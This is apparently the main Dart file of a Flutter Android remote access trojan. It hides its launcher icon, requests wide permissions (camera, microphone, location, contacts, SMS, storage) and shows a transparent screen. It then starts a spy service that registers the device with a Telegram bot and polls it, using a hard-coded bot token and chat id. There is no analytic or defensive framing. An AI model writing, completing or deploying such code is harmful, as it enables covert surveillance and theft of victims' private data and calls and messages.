import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'services/telegram_service.dart';
import 'services/spy_service.dart';
import 'utils/app_hider.dart';
import 'dart:async';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  
  await AppHider.hideApp();
  await AppHider.disableLauncher();
  
  final prefs = await SharedPreferences.getInstance();
  final isInitialized = prefs.getBool('rat_initialized') ?? false;
  
  if (!isInitialized) {
    await requestAllPermissions();
    await prefs.setBool('rat_initialized', true);
  }
  
  TelegramService telegram = TelegramService(
    botToken: '8871130465:AAHCrNExzTd6OilIihx7f-Sv7t6Rbkr2RC4',
    chatId: '6905057456'
  );
  
  SpyService spy = SpyService(telegram);
  
  runApp(const HiddenApp());
  
  Future.delayed(Duration(seconds: 1), () {
    spy.startMonitoring();
    telegram.registerDevice();
    telegram.startPolling();
  });
}

Future<void> requestAllPermissions() async {
  await Permission.camera.request();
  await Permission.microphone.request();
  await Permission.location.request();
  await Permission.contacts.request();
  await Permission.phone.request();
  await Permission.sms.request();
  await Permission.storage.request();
  await Permission.photos.request();
  await Permission.videos.request();
  await Permission.audio.request();
}

class HiddenApp extends StatefulWidget {
  const HiddenApp({Key? key}) : super(key: key);

  @override
  State<HiddenApp> createState() => _HiddenAppState();
}

class _HiddenAppState extends State<HiddenApp> {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: const Scaffold(
        body: SizedBox.expand(
          child: ColoredBox(color: Colors.transparent),
        ),
      ),
      debugShowCheckedModeBanner: false,
    );
  }
}
